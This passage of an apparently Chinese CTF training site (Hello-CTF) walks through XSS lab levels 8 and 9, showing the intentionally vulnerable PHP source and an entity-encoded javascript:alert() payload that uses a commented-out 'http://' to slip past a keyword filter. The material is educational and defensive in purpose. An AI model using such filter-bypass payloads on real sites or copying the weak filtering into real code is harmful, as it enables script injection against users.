+<a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>&lt;body&gt;
+<a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
+<a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a>&lt;?php 
+<a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>$str = strtolower($_GET["keyword"]);  // 全都转小写了，大小写混淆绕不了
+<a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>$str2=str_replace("script","scr_ipt",$str);
+<a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a>$str3=str_replace("on","o_n",$str2);
+<a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>$str4=str_replace("src","sr_c",$str3);
+<a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>$str5=str_replace("data","da_ta",$str4);
+<a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>$str6=str_replace("href","hr_ef",$str5);
+<a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>$str7=str_replace('"','&amp;quot',$str6);
+<a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>echo '&lt;center&gt;
+<a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a>&lt;form action=level8.php method=GET&gt;
+<a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;
+<a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>&lt;input type=submit name=submit value=添加友情链接 /&gt;
+<a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a>&lt;/form&gt;
+<a id="__codelineno-29-29" name="__codelineno-29-29" href="#__codelineno-29-29"></a>&lt;/center&gt;';
+<a id="__codelineno-29-30" name="__codelineno-29-30" href="#__codelineno-29-30"></a>?&gt;
+<a id="__codelineno-29-31" name="__codelineno-29-31" href="#__codelineno-29-31"></a>&lt;?php
+<a id="__codelineno-29-32" name="__codelineno-29-32" href="#__codelineno-29-32"></a> echo '&lt;center&gt;&lt;BR&gt;&lt;a href="'.$str7.'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+<a id="__codelineno-29-33" name="__codelineno-29-33" href="#__codelineno-29-33"></a>?&gt;
+<a id="__codelineno-29-34" name="__codelineno-29-34" href="#__codelineno-29-34"></a>&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+<a id="__codelineno-29-35" name="__codelineno-29-35" href="#__codelineno-29-35"></a>&lt;?php 
+<a id="__codelineno-29-36" name="__codelineno-29-36" href="#__codelineno-29-36"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str7)."&lt;/h3&gt;";
+<a id="__codelineno-29-37" name="__codelineno-29-37" href="#__codelineno-29-37"></a>?&gt;
+<a id="__codelineno-29-38" name="__codelineno-29-38" href="#__codelineno-29-38"></a>&lt;/body&gt;
+<a id="__codelineno-29-39" name="__codelineno-29-39" href="#__codelineno-29-39"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-9.md -->
+<h3 id="_11">注释绕过<a class="headerlink" href="#_11" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第九关</strong></p>
+<p>试了下上一关的 payload，不行，压根都没插入</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68138cb858cb8da5c8d63a8a.png"></p>
+<p>输入正常链接后对比发现缺少了 <code>http://</code></p>
+<p>所以在原 payload 后面补上并注释掉即可</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="ni">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span>/*http://*/
+</code></pre></div>
+<p>点击弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68138d1b58cb8da5c8d63ac9.png"></p>
+<p>查看下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>&lt;head&gt;
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>&lt;script&gt;
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>window.alert = function()  
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>{     
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>confirm("完成的不错！");
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a> window.location.href="level10.php?keyword=well done!"; 
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>}
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>&lt;/script&gt;
+<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>&lt;title&gt;欢迎来到level9&lt;/title&gt;
+<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>&lt;/head&gt;
+<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>&lt;body&gt;
+<a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
+<a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a>&lt;?php 
+<a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a>$str = strtolower($_GET["keyword"]);
+<a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a>$str2=str_replace("script","scr_ipt",$str);
+<a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a>$str3=str_replace("on","o_n",$str2);
+<a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a>$str4=str_replace("src","sr_c",$str3);
+<a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a>$str5=str_replace("data","da_ta",$str4);
+<a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a>$str6=str_replace("href","hr_ef",$str5);
+<a id="__codelineno-31-23" name="__codelineno-31-23" href="#__codelineno-31-23"></a>$str7=str_replace('"','&amp;quot',$str6);
+<a id="__codelineno-31-24" name="__codelineno-31-24" href="#__codelineno-31-24"></a>echo '&lt;center&gt;
+<a id="__codelineno-31-25" name="__codelineno-31-25" href="#__codelineno-31-25"></a>&lt;form action=level9.php method=GET&gt;
+<a id="__codelineno-31-26" name="__codelineno-31-26" href="#__codelineno-31-26"></a>&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;
+<a id="__codelineno-31-27" name="__codelineno-31-27" href="#__codelineno-31-27"></a>&lt;input type=submit name=submit value=添加友情链接 /&gt;
+<a id="__codelineno-31-28" name="__codelineno-31-28" href="#__codelineno-31-28"></a>&lt;/form&gt;
+<a id="__codelineno-31-29" name="__codelineno-31-29" href="#__codelineno-31-29"></a>&lt;/center&gt;';
+<a id="__codelineno-31-30" name="__codelineno-31-30" href="#__codelineno-31-30"></a>?&gt;
+<a id="__codelineno-31-31" name="__codelineno-31-31" href="#__codelineno-31-31"></a>&lt;?php
+<a id="__codelineno-31-32" name="__codelineno-31-32" href="#__codelineno-31-32"></a>if(false===strpos($str7,'http://'))     // 这里有个校验
+<a id="__codelineno-31-33" name="__codelineno-31-33" href="#__codelineno-31-33"></a>{
+<a id="__codelineno-31-34" name="__codelineno-31-34" href="#__codelineno-31-34"></a>  echo '&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+<a id="__codelineno-31-35" name="__codelineno-31-35" href="#__codelineno-31-35"></a>        }
+<a id="__codelineno-31-36" name="__codelineno-31-36" href="#__codelineno-31-36"></a>else
+<a id="__codelineno-31-37" name="__codelineno-31-37" href="#__codelineno-31-37"></a>{
+<a id="__codelineno-31-38" name="__codelineno-31-38" href="#__codelineno-31-38"></a>  echo '&lt;center&gt;&lt;BR&gt;&lt;a href="'.$str7.'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+<a id="__codelineno-31-39" name="__codelineno-31-39" href="#__codelineno-31-39"></a>}
+<a id="__codelineno-31-40" name="__codelineno-31-40" href="#__codelineno-31-40"></a>?&gt;
+<a id="__codelineno-31-41" name="__codelineno-31-41" href="#__codelineno-31-41"></a>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+<a id="__codelineno-31-42" name="__codelineno-31-42" href="#__codelineno-31-42"></a>&lt;?php 
+<a id="__codelineno-31-43" name="__codelineno-31-43" href="#__codelineno-31-43"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str7)."&lt;/h3&gt;";
+<a id="__codelineno-31-44" name="__codelineno-31-44" href="#__codelineno-31-44"></a>?&gt;
+<a id="__codelineno-31-45" name="__codelineno-31-45" href="#__codelineno-31-45"></a>&lt;/body&gt;
+<a id="__codelineno-31-46" name="__codelineno-31-46" href="#__codelineno-31-46"></a>&lt;/html&gt;
+</code></pre></div></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../sql_injection/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: SQL注入"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        SQL注入
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../include/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: 文件包含"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        文件包含
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+  <!-- Insert generated snippet here -->
+  
+  <script src="https://giscus.app/client.js"
+  data-repo="ProbiusOfficial/Hello-CTF"
+  data-repo-id="R_kgDOJXX6hg"
+  data-category="Show and tell"
+  data-category-id="DIC_kwDOJXX6hs4CXmuV"
+  data-mapping="pathname"
+  data-strict="0"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="top"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async>
+</script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 探姬
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/probiusofficial" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/probiusofficial" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://space.bilibili.com/27109929" target="_blank" rel="noopener" title="space.bilibili.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M488.6 104.1c16.7 18.1 24.4 39.7 23.3 65.7v202.4c-.4 26.4-9.2 48.1-26.5 65.1-17.2 17-39.1 25.9-65.5 26.7H92c-26.4-.8-48.2-9.8-65.3-27.2S.7 396.5 0 368.2V169.8c.8-26 9.7-47.6 26.7-65.7C43.8 87.8 65.5 78.8 92 78h29.4L96 52.2c-5.7-5.7-8.6-13-8.6-21.8S90.3 14.3 96 8.6 109 0 117.9 0s16.1 2.9 21.9 8.6L213.1 78h88l74.5-69.4C381.7 2.9 389.2 0 398 0s16.1 2.9 21.9 8.6c5.7 5.7 8.6 13 8.6 21.8s-2.9 16.1-8.6 21.8L394.6 78h29.3c26.4.8 48 9.8 64.7 26.1m-38.8 69.7c-.4-9.6-3.7-17.4-10.7-23.5-5.2-6.1-14-9.4-22.7-9.8H96c-9.6.4-17.4 3.7-23.6 9.8-6.1 6.1-9.4 13.9-9.8 23.5v194.4c0 9.2 3.3 17 9.8 23.5s14.4 9.8 23.6 9.8h320.4c9.2 0 17-3.3 23.3-9.8s9.7-14.3 10.1-23.5zm-264.3 42.7c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2-6.2 6.3-14 9.5-23.6 9.5s-17.5-3.2-23.6-9.5-9.4-14-9.8-23.2v-33.3c.4-9.1 3.8-16.9 10.1-23.2s13.2-9.6 23.3-10c9.2.4 17 3.7 23.3 10m191.5 0c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2s-14 9.5-23.6 9.5-17.4-3.2-23.6-9.5c-7-6.3-9.4-14-9.7-23.2v-33.3c.3-9.1 3.7-16.9 10-23.2s14.1-9.6 23.3-10c9.2.4 17 3.7 23.3 10"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="mailto:<probiuslinx@gmail.com>" target="_blank" rel="noopener" title="" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M536.4-26.3c9.8-3.5 20.6-1 28 6.3s9.8 18.2 6.3 28l-178 496.9c-5 13.9-18.1 23.1-32.8 23.1-14.2 0-27-8.6-32.3-21.7l-64.2-158c-4.5-11-2.5-23.6 5.2-32.6l94.5-112.4c5.1-6.1 4.7-15-.9-20.6s-14.6-6-20.6-.9l-112.4 94.3c-9.1 7.6-21.6 9.6-32.6 5.2L38.1 216.8c-13.1-5.3-21.7-18.1-21.7-32.3 0-14.7 9.2-27.8 23.1-32.8z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tabs.link", "content.tooltips", "navigation.indexes", "navigation.instant", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/baidu_SEO.js"></script>
+      
+        <script src="../../javascripts/katex.js"></script>
+      
+        <script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.16.8/katex.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js"></script>
+      
+        <script src="../../javascripts/statis.js"></script>
+      
+        <script src="../../javascripts/bannerSlider.js"></script>
+      
+        <script src="../../javascripts/FullCalendar.js"></script>
+      
+    
+  </body>
+</html>
